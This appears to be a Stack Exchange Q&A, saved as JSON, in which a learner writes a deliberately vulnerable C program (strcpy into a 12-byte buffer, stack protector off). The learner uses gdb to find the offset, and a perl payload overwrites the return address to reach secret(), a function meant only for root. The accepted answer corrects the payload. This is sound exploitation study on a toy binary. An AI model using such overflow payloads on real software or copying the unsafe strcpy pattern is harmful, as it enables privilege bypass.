{
    "title": "Writing an exploit for sample-application",
    "link": "https://reverseengineering.stackexchange.com/questions/11020/writing-an-exploit-for-sample-application",
    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  I understand the principles of exploiting a classical stack-based buffer-overflow, and now I want to practice it. Therefore I wrote the following test-application:\n </p>\n <pre><code>#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n\nvoid public(char *args) {\n    char buff[12];\n    memset(buff, 'B', sizeof(buff));\n\n    strcpy(buff, args);\n    printf(\"\nbuff: [%s] (%p)(%d)\n\n\", &buff, buff, sizeof(buff));\n}\n\nvoid secret(void) {\n    printf(\"SECRET\n\");\n    exit(0);\n}\n\nint main(int argc, char *argv[]) {\n    int uid;\n    uid = getuid();\n\n    // Only when the user is root\n    if (uid == 0)\n        secret();\n\n    if (argc > 1) {\n        public(argv[1]);\n    }\n    else\n        printf(\"Kein Argument!\n\");\n}\n</code></pre>\n <p>\n  When the user which starts the program is\n  <em>\n   root\n  </em>\n  , the method\n  <code>\n   secret()\n  </code>\n  is being called,\n  <em>\n   otherwise\n  </em>\n  , the method\n  <code>\n   public(...)\n  </code>\n  is being called.\nI am using debian-gnome x64, so I had to compile it specifically to x86 to get x86-assembly (which I know better than x64).\nI compiled the program with gcc:\n  <code>\n   gcc ret.c -o ret -m32 -g -fno-stack-protector\n  </code>\n </p>\n <hr/>\n <p>\n  <strong>\n   Target:\n  </strong>\n  I want to call the method\n  <code>\n   secret()\n  </code>\n  without being a\n  <em>\n   root-user\n  </em>\n  .\n  <em>\n   {To do that I have to overwrite the\n   <code>\n    R\n   </code>\n   eturn\n   <code>\n    I\n   </code>\n   nstruction\n   <code>\n    P\n   </code>\n   ointer (\n   <code>\n    RIP\n   </code>\n   ) with the address of the function\n   <code>\n    secret()\n   </code>\n   }\n  </em>\n </p>\n <p>\n  <strong>\n   Vulnerability:\n  </strong>\n  The method\n  <code>\n   public(...)\n  </code>\n  copies the program-args with the unsafe\n  <code>\n   strcpy()\n  </code>\n  method into the\n  <code>\n   char-array\n  </code>\n  <strong>\n   buff\n  </strong>\n  . So it is possible to overwrite data on the stack, when the user starts the program with an\n  <em>\n   arg > 11\n  </em>\n  , where\n  <em>\n   arg\n  </em>\n  should be the length of the string-arg.\n </p>\n <p>\n  <strong>\n   Required Information:\n  </strong>\n </p>\n <ul>\n  <li>\n   The address of the function\n   <code>\n    secret()\n   </code>\n   .\n  </li>\n  <li>\n   The address of the first buffer's first element. Due to\n   <code>\n    ASCII\n   </code>\n   -Encoding I know that each\n   <code>\n    char\n   </code>\n   has a size of\n   <code>\n    1 byte\n   </code>\n   , so that the buffer's last element is\n   <code>\n    12 bytes\n   </code>\n   ahead the first element.\n  </li>\n  <li>\n   The address of the\n   <code>\n    RIP\n   </code>\n   , because I have to overwrite it\n   <code>\n    secret()\n   </code>\n   s address.\n  </li>\n  <li>\n   <em>\n    OPTIONAL: It also helps to know the address of the\n    <code>\n     S\n    </code>\n    afed\n    <code>\n     F\n    </code>\n    rame\n    <code>\n     P\n    </code>\n    ointer (\n    <code>\n     SFP\n    </code>\n    ).\n   </em>\n  </li>\n </ul>\n <p>\n  <strong>\n   Methodical approach:\n  </strong>\n </p>\n <ul>\n  <li>\n   Load the program into\n   <code>\n    gdb\n   </code>\n   :\n   <code>\n    gdb -q ret\n   </code>\n   .\n  </li>\n  <li>\n   To get an overview of the full stack-frame of the method\n   <code>\n    public(...)\n   </code>\n   I have to set a breakpoint there, where the\n   <code>\n    function-epilogue\n   </code>\n   starts. This is at the enclosing brace\n   <code>\n    }\n   </code>\n   at line\n   <code>\n    11\n   </code>\n   .\n  </li>\n  <li>\n   Now I have to run the program with a valid arg:\n   <code>\n    run A\n   </code>\n   .\n  </li>\n  <li>\n   <p>\n    At the breakpoint, I now want to view the stack-frame.\n   </p>\n   <pre><code>(gdb) info frame 0\nStack frame at 0xffffd2f0:\n eip = 0x804852d in public (ret.c:11); saved eip = 0x804858c\n called by frame at 0xffffd330\n source language c.\n Arglist at 0xffffd2e8, args: args=0xffffd575 \"A\"\n Locals at 0xffffd2e8, Previous frame's sp is 0xffffd2f0\n Saved registers:\n  ebp at 0xffffd2e8, eip at 0xffffd2ec\n</code></pre>\n   <p>\n    Because from that I can gather the following information:\n   </p>\n   <ul>\n    <li>\n     The\n     <code>\n      RIP\n     </code>\n     is located at\n     <code>\n      0xffffd2ec\n     </code>\n     and contains the address\n     <code>\n      0x804858c\n     </code>\n     which contains the instruction\n     <code>\n      0x804858c <main+61>: add    $0x10,%esp\n     </code>\n     .\n    </li>\n    <li>\n     The\n     <code>\n      SFP\n     </code>\n     is located at\n     <code>\n      0xffffd2e8\n     </code>\n     .\n    </li>\n    <li>\n     <p>\n      Now I need the address, where the\n      <code>\n       secret()\n      </code>\n      -function starts:\n     </p>\n     <p>\n      (gdb) print secret\n$2 = {void (void)} 0x804852f\n     </p>\n    </li>\n   </ul>\n  </li>\n  <li>\n   <p>\n    Last, but not least I get the buffer's address:\n   </p>\n   <pre><code>(gdb) print/x &buff\n$4 = 0xffffd2d4\n</code></pre>\n  </li>\n  <li>\n   <p>\n    To sum it up:\n   </p>\n   <ul>\n    <li>\n     <code>\n      RIP\n     </code>\n     is at\n     <code>\n      0xffffd2ec\n     </code>\n     .\n    </li>\n    <li>\n     <code>\n      SFP\n     </code>\n     is at\n     <code>\n      0xffffd2e8\n     </code>\n     .\n    </li>\n    <li>\n     <code>\n      buff\n     </code>\n     is at\n     <code>\n      0xffffd2d4\n     </code>\n     .\n    </li>\n   </ul>\n  </li>\n </ul>\n <p>\n  This means that I would have to run the program with\n  <code>\n   0xffffd2ec\n  </code>\n  -\n  <code>\n   0xffffd2d4\n  </code>\n  +\n  <code>\n   0x04\n  </code>\n  =\n  <code>\n   28 bytes\n  </code>\n  (=\n  <code>\n   char\n  </code>\n  s).\n </p>\n <p>\n  So, to exploit it I'd have to run the program with an arg which is\n  <code>\n   28 bytes\n  </code>\n  long whereas the last\n  <code>\n   4 bytes\n  </code>\n  contain the address of the function\n  <code>\n   secret()\n  </code>\n  (and pay attention to little-endian-ordering):\n </p>\n <pre><code>(gdb) run `perl -e '{print \"A\"x24; print \"\\xec\\d2\\ff\\ff\"; }'`\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\n\nStarting program: /home/patrick/Projekte/C/I. Stack_Overflow/ret `perl -e '{print \"A\"x24; print \"\\xec\\d2\\ff\\ff\"; }'`\n\nbuff: [AAAAAAAAAAAAAAAAAAAAAAAAï¿½d2\n                                  f\n                                   f] (0xffffd2b4)(12)\n\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0c3264ec in ?? ()\n</code></pre>\n <p>\n  Two questions are rising up:\n </p>\n <ul>\n  <li>\n   <p>\n    Why is it not working. This example is basically from an older book I'm reading. But theoretically it should work so I think....\n   </p>\n  </li>\n  <li>\n   <p>\n    Why is between\n    <code>\n     buff\n    </code>\n    and the\n    <code>\n     SFP\n    </code>\n    a\n    <code>\n     8-byte\n    </code>\n    gap? What does this memory-area contain?\n   </p>\n  </li>\n </ul>\n <p>\n  <strong>\n   EDIT:\n   <a href=\"https://drive.google.com/file/d/0BxV4F9km7MRVa0RKOGk5T3c2UVE/view?usp=sharing\" rel=\"noreferrer\">\n    That's\n   </a>\n   a download-link to the binary.\n  </strong>\n </p>\n</div>\n</body></html>",
    "votes": "5",
    "answers": 1,
    "views": "3k",
    "tags": [
        "c++",
        "gdb",
        "c",
        "exploit",
        "stack"
    ],
    "user": "JDoens",
    "time": "Oct 4, 2015 at 22:58",
    "comments": [
        {
            "user": "Jason Geffner",
            "text": "<html><body><span class=\"comment-copy\">\n It would help if you could provide a link to the binary.\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "JDoens",
            "text": "<html><body><span class=\"comment-copy\">\n Thanks that you want to help me!\n <a href=\"https://drive.google.com/file/d/0BxV4F9km7MRVa0RKOGk5T3c2UVE/view?usp=sharing\" rel=\"nofollow noreferrer\">\n  That's the link\n </a>\n to the binary.\n</span>\n</body></html>",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <blockquote>\n  <ul>\n   <li>\n    Why is it not working. This example is basically from an older book I'm reading. But theoretically it should work so I think....\n   </li>\n  </ul>\n </blockquote>\n <p>\n  It's because you're overwriting the return address on the stack with\n  <code>\n   0xffffd2ec\n  </code>\n  instead of\n  <code>\n   0x0804852f\n  </code>\n  (the latter is the address for\n  <code>\n   secret()\n  </code>\n  ).\n </p>\n <p>\n  If you thus use\n  <code>\n   '{print \"A\"x24; print \"\\x2f\\85\\04\\08\"; }'\n  </code>\n  instead, it should work.\n </p>\n <blockquote>\n  <ul>\n   <li>\n    Why is between\n    <code>\n     buff\n    </code>\n    and the\n    <code>\n     SFP\n    </code>\n    a\n    <code>\n     8-byte\n    </code>\n    gap? What does this memory-area contain?\n   </li>\n  </ul>\n </blockquote>\n <p>\n  That gap is probably because of attempted optimizations made by gcc. The memory-area contains nothing (well, technically it contains 8 bytes whose values are indeterminate) and the code in the\n  <code>\n   public()\n  </code>\n  function neither reads from nor writes to that memory-area.\n </p>\n</div>\n</body></html>",
            "votes": "5",
            "user": "Jason Geffner",
            "time": "Oct 4, 2015 at 23:49",
            "is_accepted": true,
            "comments": [
                {
                    "user": "JDoens",
                    "text": "<span class=\"comment-copy\">Thanks! You are right, I did not overwrite the <code>RIP</code> with <code>secret()</code>s address. But you forgot to reverse the byte-order (it's little-endian).</span>",
                    "time": null
                },
                {
                    "user": "Jason Geffner",
                    "text": "<span class=\"comment-copy\">Good catch; just fixed the byte-order.</span>",
                    "time": null
                }
            ]
        }
    ]
}